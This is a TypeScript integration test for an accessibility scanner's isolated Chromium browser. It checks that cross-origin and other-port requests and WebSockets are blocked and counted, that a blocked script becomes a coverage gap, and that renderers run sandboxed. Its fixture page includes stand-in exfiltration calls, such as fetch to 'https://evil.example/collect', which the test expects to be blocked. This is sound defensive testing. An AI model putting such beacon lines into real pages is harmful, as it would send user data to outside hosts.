/**
 * The judge's browser against real Chromium. Gated behind USABL_INTEGRATION=1 like the other
 * real-browser suites.
 *
 * Three claims are checked here, each against a real process and a real network:
 * - requests and WebSockets to another origin, or to another port on the same loopback host, are
 *   aborted and counted, while the app origin loads;
 * - a blocked script that would have added an inaccessible control does not turn into a clean
 *   screen: the screen becomes a coverage gap that names the origin;
 * - page script runs inside the Chromium sandbox, which the judge requires, so a system that
 *   cannot give the sandbox refuses the scan instead of running without it.
 */
import { readdirSync, readFileSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { chromium } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { makeRealBrowserDriver } from '../../src/deps/real.js';
import { startBuildServer, type BuildServer } from '../../src/judge/serve-build.js';
import { axeProvider } from '../../src/providers/axe/index.js';
import { makeCheckRunner } from '../../src/providers/check-runner.js';
import { makeStepRunner } from '../../src/providers/keyboard-walk/steps.js';
import type { Page } from '../../src/contracts/index.js';
import type { BrowserIsolation } from '../../src/judge/request-filter.js';
import { testConfig } from '../helpers.js';

interface Recorder {
  server: Server;
  port: number;
  hits: string[];
}

// A second loopback server the page must not reach. It records every request it is sent, so a
// block that silently failed would show up here as a hit.
async function makeRecorder(): Promise<Recorder> {
  const hits: string[] = [];
  const server = createServer((req, res) => {
    hits.push(req.url ?? '');
    if ((req.url ?? '').startsWith('/widget.js')) {
      res.writeHead(200, { 'content-type': 'text/javascript' });
      // The control this script adds has no accessible name: the barrier a block would hide.
      res.end("document.body.insertAdjacentHTML('beforeend', '<button id=\"bare\"></button>');");
      return;
    }
    res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' });
    res.end('reached');
  });
  // A WebSocket handshake arrives as an upgrade, not a request, so it is recorded on its own.
  server.on('upgrade', (req, socket) => {
    hits.push(`upgrade ${req.url ?? ''}`);
    socket.destroy();
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  const port = address !== null && typeof address === 'object' ? address.port : 0;
  return { server, port, hits };
}

// Every Chromium process started under this test process, found by walking parent ids.
function descendantRenderers(): Array<{ pid: string; cmdline: string; seccomp: string }> {
  const parents = new Map<string, string>();
  for (const pid of readdirSync('/proc').filter((entry) => /^\d+$/.test(entry))) {
    try {
      const stat = readFileSync(`/proc/${pid}/stat`, 'utf8');
      const ppid = stat.slice(stat.lastIndexOf(')') + 2).split(' ')[1] ?? '';
      parents.set(pid, ppid);
    } catch {
      continue;
    }
  }
  const self = String(process.pid);
  const isDescendant = (pid: string): boolean => {
    let current = parents.get(pid);
    for (let depth = 0; current !== undefined && depth < 20; depth += 1) {
      if (current === self) return true;
      current = parents.get(current);
    }
    return false;
  };
  const renderers: Array<{ pid: string; cmdline: string; seccomp: string }> = [];
  for (const pid of parents.keys()) {
    if (!isDescendant(pid)) continue;
    try {
      const cmdline = readFileSync(`/proc/${pid}/cmdline`, 'utf8').replace(/\0/g, ' ');
      if (!cmdline.includes('--type=renderer')) continue;
      const seccomp = /Seccomp:\s*(\d)/.exec(readFileSync(`/proc/${pid}/status`, 'utf8'))?.[1] ?? '';
      renderers.push({ pid, cmdline, seccomp });
    } catch {
      continue;
    }
  }
  return renderers;
}

describe.skipIf(process.env.USABL_INTEGRATION !== '1')('the judge isolated browser in real Chromium', () => {
  let buildDir: string;
  let app: BuildServer;
  let recorder: Recorder;

  beforeAll(async () => {
    recorder = await makeRecorder();
    buildDir = mkdtempSync(join(tmpdir(), 'usabl-isolated-'));
    const other = `http://127.0.0.1:${recorder.port}`;
    writeFileSync(
      join(buildDir, 'index.html'),
      `<!doctype html><html lang="en"><title>app</title><main><h1>App</h1>
      <p id="own" data-state="pending">own</p><p id="other" data-state="pending">other</p>
      <p id="remote" data-state="pending">remote</p>
      <script>
        const mark = (id, state) => { document.getElementById(id).dataset.state = state; };
        fetch('/data.json').then((r) => r.json()).then((d) => mark('own', d.ok));
        fetch('${other}/collect?x=1').then(() => mark('other', 'reached'), () => mark('other', 'blocked'));
        fetch('https://evil.example/collect').then(() => mark('remote', 'reached'), () => mark('remote', 'blocked'));
        new WebSocket('ws://127.0.0.1:${recorder.port}/socket');
      </script></main></html>`,
    );
    writeFileSync(join(buildDir, 'data.json'), '{"ok":"loaded"}');
    writeFileSync(
      join(buildDir, 'widget.html'),
      `<!doctype html><html lang="en"><title>widget</title><main><h1>Widget</h1>
      <script src="${other}/widget.js"></script></main></html>`,
    );
    app = await startBuildServer({ dir: buildDir, host: '127.0.0.1', port: 0 });
  });

  afterAll(async () => {
    await app?.close();
    await new Promise<void>((resolve) => recorder?.server.close(() => resolve()));
    rmSync(buildDir, { recursive: true, force: true });
  });

  // Reads a data-state attribute until the page script has set it, or the wait runs out.
  async function settledState(page: Page, selector: string): Promise<string | null> {
    for (let attempt = 0; attempt < 100; attempt += 1) {
      const state = await page.getAttribute(selector, 'data-state');
      if (state !== 'pending') return state;
      await new Promise((resolve) => setTimeout(resolve, 50));
    }
    return 'pending';
  }

  function isolation(): { isolation: BrowserIsolation; blocked: string[] } {
    const blocked: string[] = [];
    return {
      blocked,
      isolation: { allowedOrigins: new Set([app.url]), onBlocked: (url) => blocked.push(url) },
    };
  }

  it('blocks and counts another origin and another loopback port while the app origin loads', async () => {
    const { isolation: iso, blocked } = isolation();
    const driver = makeRealBrowserDriver({ isolation: iso, browserSandbox: 'require' });
    try {
      const page = await driver.open(`${app.url}/`);
      await page.gotoReady();
      expect(await settledState(page, '#own')).toBe('loaded');
      expect(await settledState(page, '#other')).toBe('blocked');
      expect(await settledState(page, '#remote')).toBe('blocked');

      expect(recorder.hits.filter((hit) => hit.startsWith('/collect'))).toEqual([]);
      expect(blocked.some((url) => url.startsWith(`http://127.0.0.1:${recorder.port}/collect`))).toBe(true);
      expect(blocked.some((url) => url.startsWith('https://evil.example/'))).toBe(true);
      // The socket is judged by its own filter, which may answer a moment after the fetches.
      for (let attempt = 0; attempt < 100 && ((await page.blockedRequests?.()) ?? []).length < 3; attempt += 1) {
        await new Promise((resolve) => setTimeout(resolve, 50));
      }
      expect(recorder.hits.filter((hit) => hit.startsWith('upgrade'))).toEqual([]);
      expect(await page.blockedRequests?.()).toEqual(
        [`http://127.0.0.1:${recorder.port}`, 'https://evil.example', `ws://127.0.0.1:${recorder.port}`].sort(),
      );
      await page.close();
    } finally {
      await driver.close();
    }
  }, 60_000);

  it('makes the screen a coverage gap when a blocked script would have added the barrier', async () => {
    const { isolation: iso } = isolation();
    const driver = makeRealBrowserDriver({ isolation: iso, browserSandbox: 'require' });
    try {
      const runner = makeCheckRunner({
        browser: driver,
        providers: [axeProvider],
        config: testConfig({ appBaseUrl: app.url }),
        allowedCapabilities: ['live'],
        stepRunner: makeStepRunner(),
      });
      const scan = await runner.scan({ id: 'widget', url: `${app.url}/widget.html` });
      // The script never ran, so the nameless button is not on the page and axe finds nothing.
      expect(scan.drafts.filter((draft) => draft.rule === 'button-name')).toEqual([]);
      expect(recorder.hits.filter((hit) => hit.startsWith('/widget.js'))).toEqual([]);
      // That silence is not a pass: the screen is not covered, and the gap names the origin.
      const gap = scan.gaps.find((entry) => entry.reason.includes('isolated browser blocked'));
      expect(gap?.state).toBe('not-covered');
      expect(gap?.reason).toContain(`http://127.0.0.1:${recorder.port}`);
    } finally {
      await driver.close();
    }
  }, 60_000);

  it('shows the same barrier when the script origin is allowed, so the gap was the only difference', async () => {
    const driver = makeRealBrowserDriver({
      isolation: {
        allowedOrigins: new Set([app.url, `http://127.0.0.1:${recorder.port}`]),
        onBlocked: () => undefined,
      },
      browserSandbox: 'require',
    });
    try {
      const runner = makeCheckRunner({
        browser: driver,
        providers: [axeProvider],
        config: testConfig({ appBaseUrl: app.url }),
        allowedCapabilities: ['live'],
        stepRunner: makeStepRunner(),
      });
      const scan = await runner.scan({ id: 'widget', url: `${app.url}/widget.html` });
      expect(scan.drafts.some((draft) => draft.rule === 'button-name')).toBe(true);
      expect(scan.gaps.filter((entry) => entry.reason.includes('isolated browser blocked'))).toEqual([]);
    } finally {
      await driver.close();
    }
  }, 60_000);

  it('runs page script inside the Chromium sandbox, unlike a default Playwright launch', async () => {
    const { isolation: iso } = isolation();
    const driver = makeRealBrowserDriver({ isolation: iso, browserSandbox: 'require' });
    try {
      const page = await driver.open(`${app.url}/data.json`);
      // A page from a process without the sandbox would carry browserSandbox: 'off'.
      expect(page.browserSandbox).toBeUndefined();
      const renderers = descendantRenderers();
      expect(renderers.length).toBeGreaterThan(0);
      for (const renderer of renderers) {
        expect(renderer.cmdline).not.toContain('--no-sandbox');
        // 2 is a seccomp-bpf filter: the renderer is confined by the sandbox.
        expect(renderer.seccomp).toBe('2');
      }
      await page.close();
    } finally {
      await driver.close();
    }

    // The control: Playwright's default launch, which usabl never uses, runs unsandboxed.
    const plain = await chromium.launch({ headless: true });
    try {
      const page = await plain.newPage();
      await page.goto(`${app.url}/data.json`);
      const renderers = descendantRenderers();
      expect(renderers.length).toBeGreaterThan(0);
      expect(renderers.every((renderer) => renderer.cmdline.includes('--no-sandbox'))).toBe(true);
    } finally {
      await plain.close();
    }
  }, 60_000);
});
